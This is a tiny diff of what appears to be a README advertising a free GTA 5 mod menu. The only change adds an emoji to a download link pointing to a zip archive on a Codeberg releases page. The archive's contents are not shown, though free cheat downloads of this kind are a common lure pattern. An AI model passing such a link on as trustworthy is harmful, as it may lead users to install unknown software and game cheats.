@@ -22,7 +22,7 @@ Customize your gameplay, explore hidden features, and dominate the streets of Lo
 
 Get started in seconds — download now:
 
-👉 [**Download GTA 5 Mod Menu (Free)**](https://codeberg.org/aimtools/downloads/releases/download/mod/Mod%20Menu.zip)
+👉 [**Download GTA 5 Mod Menu (Free)**](https://codeberg.org/aimtools/downloads/releases/download/mod/Mod%20Menu.zip) 📥
 
 ---
 
